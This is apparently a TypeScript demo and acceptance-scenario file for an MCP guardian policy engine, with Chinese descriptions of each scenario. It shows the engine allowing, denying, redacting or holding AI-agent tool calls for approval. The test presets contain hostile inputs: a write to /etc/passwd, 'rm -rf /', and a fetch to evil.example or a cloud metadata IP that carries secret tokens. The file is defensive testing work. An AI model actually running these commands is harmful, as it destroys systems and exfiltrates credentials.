import type { Decision } from "@mcp-guardian/shared";

/** 公开 Demo / 验收用的场景叙事（按 audit id 或试跑 key） */
export type DemoCaseMeta = {
  id: string;
  acceptance: string;
  title: string;
  story: string;
  expect: string;
  action: Decision["action"];
};

export const DEMO_CASE_META: Record<string, DemoCaseMeta> = {
  "demo-audit-4": {
    id: "demo-audit-4",
    acceptance: "A1",
    title: "允许：读工作区文件",
    story: "Agent 要读 /workspace/readme.md。策略命中 allow-workspace-read，放行。",
    expect: "action = allow，审计可回放",
    action: "allow",
  },
  "demo-audit-1": {
    id: "demo-audit-1",
    acceptance: "A2",
    title: "拒绝：写入系统目录",
    story: "Agent 试图写 /etc/passwd。策略命中 deny-system-write，硬拒绝。",
    expect: "action = deny，不会执行下游工具",
    action: "deny",
  },
  "demo-audit-2": {
    id: "demo-audit-2",
    acceptance: "A3",
    title: "脱敏：HTTP 请求里的 API Key",
    story: "URL / Authorization 含密钥。策略 redact 后再放行，审计里只见 ***REDACTED***。",
    expect: "action = redact，明文密钥不落审计",
    action: "redact",
  },
  "demo-audit-3": {
    id: "demo-audit-3",
    acceptance: "A4 / A5",
    title: "需审批：高危 shell",
    story: "命令含 rm -rf。策略 require_approval；未批准前不执行。Dashboard 批准后变为 approved_then_allowed。",
    expect: "先挂起审批，批准后才允许",
    action: "require_approval",
  },
  "demo-audit-5": {
    id: "demo-audit-5",
    acceptance: "A6 / fail-closed",
    title: "默认拒绝：未匹配规则",
    story: "读 /tmp/bomb-1 无规则命中。fail-closed 模式下一律 deny（批量轰炸同理）。",
    expect: "action = deny，matched_rule_id = null",
    action: "deny",
  },
  "demo-audit-6": {
    id: "demo-audit-6",
    acceptance: "A6",
    title: "脱敏：可疑元数据 URL",
    story: "指向 169.254.169.254 且带 api_key 的 fetch，同样走 redact 规则。",
    expect: "action = redact",
    action: "redact",
  },
};

export type LiveTryPreset = {
  key: string;
  label: string;
  acceptance: string;
  server: string;
  tool: string;
  args: Record<string, unknown>;
  expectAction: string;
};

/** 页面上一键试跑：真实调用 policy-engine，不是死数据 */
export const LIVE_TRY_PRESETS: LiveTryPreset[] = [
  {
    key: "a1",
    label: "A1 读工作区",
    acceptance: "A1",
    server: "demo-fs",
    tool: "read_file",
    args: { path: "/workspace/a.txt" },
    expectAction: "allow",
  },
  {
    key: "a2",
    label: "A2 写 /etc",
    acceptance: "A2",
    server: "demo-fs",
    tool: "write_file",
    args: { path: "/etc/passwd", content: "x" },
    expectAction: "deny",
  },
  {
    key: "a3",
    label: "A3 密钥脱敏",
    acceptance: "A3",
    server: "demo-http",
    tool: "fetch",
    args: {
      url: "https://evil.example/x?token=sk-live-secret",
      headers: { authorization: "Bearer sk-live-secret" },
    },
    expectAction: "redact",
  },
  {
    key: "a4",
    label: "A4 高危 shell",
    acceptance: "A4",
    server: "demo-shell",
    tool: "run",
    args: { command: "rm -rf /" },
    expectAction: "require_approval",
  },
  {
    key: "fail-closed",
    label: "fail-closed 未匹配",
    acceptance: "A6",
    server: "demo-fs",
    tool: "read_file",
    args: { path: "/tmp/outside" },
    expectAction: "deny",
  },
];

export const ACCEPTANCE_CHECKLIST: { id: string; text: string; where: string }[] = [
  { id: "A1", text: "工作区读 → allow", where: "本页试跑 / 公开回放" },
  { id: "A2", text: "系统写 → deny", where: "本页试跑 / 公开回放" },
  { id: "A3", text: "HTTP 密钥 → redact", where: "本页试跑 / 公开回放" },
  { id: "A4", text: "危险 shell → require_approval", where: "本页试跑" },
  { id: "A5", text: "Dashboard 批准 pending 审批", where: "/app/approvals" },
  { id: "A6", text: "统计含 deny/redact/approval", where: "本页顶部数字" },
  { id: "A7", text: "断网 CLI：bash scenarios/a1-a5.sh", where: "终端" },
  { id: "A8", text: "未登录可看公开 Demo，不能改策略", where: "本页" },
];
